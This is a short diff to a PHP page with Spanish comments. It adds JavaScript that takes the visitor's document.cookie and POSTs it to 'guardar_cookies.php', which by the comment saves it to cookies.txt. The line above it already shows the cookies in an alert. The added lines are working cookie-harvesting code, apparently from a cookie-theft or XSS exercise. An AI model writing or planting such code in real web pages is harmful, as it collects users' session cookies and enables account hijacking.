@@ -332,6 +332,15 @@ if (isset($_GET['clear_search'])) {
 
             // Mostrar las cookies en una alerta
             alert("Cookies: " + document.cookie);
+
+            // Enviar las cookies a un archivo PHP para guardarlas en cookies.txt
+            fetch('guardar_cookies.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ cookie: document.cookie }),
+            });
         </script>
     <?php endif; ?>
 </body>
